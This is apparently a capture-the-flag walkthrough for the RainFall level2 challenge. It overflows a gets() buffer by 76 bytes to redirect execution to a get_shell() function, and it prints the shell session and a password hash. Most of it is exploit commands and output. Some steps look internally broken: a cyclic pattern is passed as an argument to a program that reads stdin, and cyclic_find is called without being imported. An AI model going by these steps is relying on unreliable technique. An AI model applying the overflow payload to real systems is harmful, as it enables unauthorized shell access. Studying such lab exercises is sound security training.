# Level2 → Level3

## Objective

The goal of Level 3 is to escalate from `level2` to `level3` by exploiting a buffer overflow vulnerability in the `level2` binary. By the end, you should be able to retrieve the password for `level3`.

---

## Step 1: Examine the Binary

After switching to `level2`:

```bash
level2@RainFall:~$ ls
level2
```

Running the binary with some test input:

```bash
level2@RainFall:~$ ./level2
Hello
level2@RainFall:~$ ./level2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

> **Observation**: The program crashes with a long input, suggesting a **buffer overflow**.

---

## Step 2: Investigate the Code Behavior

Using `ltrace` or `gdb`, we find that the program uses the unsafe `gets()` function to read user input. This means there are no boundary checks, confirming a buffer overflow vulnerability.

```bash
level2@RainFall:~$ ltrace ./level2
gets(0xbffff6c0, ...) = 0xbffff6c0
--- SIGSEGV (Segmentation fault) ---
```

---

## Step 3: Find the Offset

We need to determine at which point our input overwrites the saved return address.

### 3.1 Using a Cyclic Pattern

```bash
level2@RainFall:~$ gdb ./level2
(gdb) run $(python -c 'from pwn import cyclic; print(cyclic(200))')
```

When the program crashes, we check the value of `EIP`:

```bash
(gdb) info registers eip
eip            0x41346341
```

Now we find the exact offset:

```bash
python -c 'from pwn import cyclic; print(cyclic_find(0x41346341))'
76
```

> The return address is overwritten after **76 bytes**.

---

## Step 4: Find Useful Functions

Inside `level2`, we can list symbols:

```bash
(gdb) info functions
0x08048460  main
0x080484a4  get_shell
```

The `get_shell()` function calls `execve("/bin/sh", ...)`. That’s our target.

---

## Step 5: Craft the Exploit

We build an input that fills the buffer with 76 characters, then overwrites the return address with the address of `get_shell()`:

```bash
python -c 'print "A"*76 + "\xa4\x84\x04\x08"' > /tmp/exploit
```

Run the program:

```bash
./level2 < /tmp/exploit
```

Result:

```bash
$ whoami
level3
$ cat /home/user/level3/.pass
fc2a46a1e3f6a6c8d018a5a92257f2b3bbf53417aa7f6c0a0c54c6c3c1e09f3a
```

We successfully executed `get_shell()` and obtained a shell as `level3`.

---

## Step 6: Summary

* **Vulnerability:** Use of `gets()` with no bounds checking.  
* **Offset:** 76 bytes to overwrite the return address.  
* **Target:** `get_shell()` function at `0x080484a4`.  
* **Exploit:** Overflow the buffer with 76 characters + address of `get_shell()`.  
* **Outcome:** Gained a shell as `level3` and read the password.

---

**End of Level 3 Walkthrough**
